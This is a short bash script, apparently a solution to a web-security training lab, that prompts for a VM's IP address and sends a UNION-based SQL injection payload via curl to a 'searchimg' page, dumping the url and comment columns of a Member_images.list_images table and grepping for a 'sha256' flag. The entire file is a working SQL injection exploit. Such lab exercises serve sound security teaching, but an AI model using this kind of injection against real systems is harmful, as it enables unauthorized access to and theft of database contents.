#!/bin/bash

echo input the VM ip address :
read ip

url="http://${ip}/?page=searchimg"

response=$(curl -s -G -d "id=1 UNION SELECT url, comment FROM Member_images.list_images " -d "Submit=Submit" "$url" | grep "sha256")
echo "${response}"